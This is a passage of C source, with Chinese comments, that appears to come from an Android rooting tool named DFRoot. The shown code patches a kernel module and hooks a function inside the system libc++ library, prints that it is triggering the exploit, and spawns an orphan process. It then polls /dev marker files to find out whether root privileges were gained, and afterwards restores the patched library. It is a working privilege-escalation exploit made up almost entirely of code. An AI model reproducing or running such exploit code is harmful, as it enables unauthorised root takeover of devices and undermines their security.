     *       CANNOT LINK "libnativeloader.so"（官方 late_load.rs:50 switch_mnt_ns(1)）；
     *     · 克隆 init + zygote 环境并追加 /data/adb/ksu/bin 到 PATH
     *       （官方 late_load.rs:53/91-109，注释原文 "so that modules can be properly loaded"）。
     * 完整证据链与排障过程见 DFRoot_v4_KSU-Next软重启与LSPosed修复技术文档.md。 */

    struct PatchRestore libcxx_r = {0};

    int rc = 3;
    if (patch_ko(reporter)) goto done;
    if (patch_hook("/system/lib64/libc++.so",
                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                   reporter, &libcxx_r)) goto done;

    rc = 2;
    usleep(500000);
    REPORTLN("* 正在触发漏洞利用...");
    createOrphanProcess(reporter);

    static const struct {
        const char *path;
        const char *msg;
        int         rc;
    } markers[] = {
        { "/dev/df",   "1. libc++：已获取互斥锁，ko 正在加载",        -1 },
        { "/dev/dfm0", "*** 成功获取 Root 权限 ***",                   0 },
        { "/dev/dfm1", "*** 失败：ksud 执行出错退出 ***",              1 },
    };
    int seen[sizeof(markers)/sizeof(markers[0])] = {0};

    for (int elapsed = 0; elapsed < 5000; elapsed += 10) {
        usleep(10000);
        for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
            if (!seen[j] && has_marker(markers[j].path)) {
                seen[j] = 1;
                REPORTLN("%s", markers[j].msg);
                if (markers[j].rc >= 0) {
                    rc = markers[j].rc;
                    goto done;
                }
            }
        }
    }
    REPORTLN("*** 失败：时间窗内未出现结果标记 ***");
done:
    if (rc == 3) {
        REPORTLN("*** 失败：文件补丁写入失败 ***");
    }
    REPORTLN("\n=== 清理恢复现场 ===");
    restore_hook(&libcxx_r, reporter);
    fadvise_drop(kCrashDump, reporter);
    free(libcxx_r.shell_orig);
        return rc;
}
